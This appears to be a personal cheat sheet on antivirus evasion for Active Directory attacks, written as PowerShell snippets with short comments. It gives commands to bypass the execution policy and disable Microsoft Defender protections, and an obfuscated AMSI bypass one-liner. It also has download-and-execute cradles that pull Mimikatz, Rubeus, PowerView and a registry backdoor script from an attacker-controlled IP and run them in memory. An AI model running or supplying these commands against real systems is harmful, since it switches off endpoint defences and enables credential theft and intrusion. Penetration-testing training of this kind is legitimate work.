#AD_av_evasion

**Defender** = Security guard checking everyone at the door  
**AMSI** = Undercover cop listening to what you say  
**Bypass** = Showing a fake badge or sneaking through the b

|Problem|What It Does|
|---|---|
|**Execution Policy**|Blocks PowerShell scripts from running|
|**Defender**|Scans and deletes malware|
|**AMSI**|Looks for malicious commands in PowerShell


**Disable MS Defender**

- Bypass the execution policy

```powershell
# Starts PowerShell with execution policy bypassed
# Just tell PowerShell "don't block me"
powershell -ep Bypass
```

- Disable AV using powershell (Requires Local Admin rights)

```powershell
# Shows current Defender protection settings
Get-MPPreference

# Turns off real-time monitoring
Set-MPPreference -DisableRealTimeMonitoring $true

# Turns off scanning of downloaded files/attachments
Set-MPPreference -DisableIOAVProtection $true

# Turns off intrusion prevention
Set-MPPreference -DisableIntrusionPreventionSystem $true
```

- Bypass AMSI Check (If Admin rights are not available)

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

```

- Download and save the file on disk


```powershell
iwr http://192.168.100.XX/rubeus.exe -outfile rubeus.exe
```

- Download and execute cradle (Files can be hosted using HFS.exe or Python Webserver)


```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/PowerView.ps1')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Invoke-Mimikatz.ps1')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/mimilib.dll')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Set-RemotePSRemoting.ps1')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Set-RemoteWMI.ps1')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/MS-RPRN.exe')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Rubeus.exe')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Add-RemoteRegBackdoor.ps1')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Find-PSRemotingLocalAdminAccess.ps1')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Find-WMILocalAdminAccess.ps1')

```
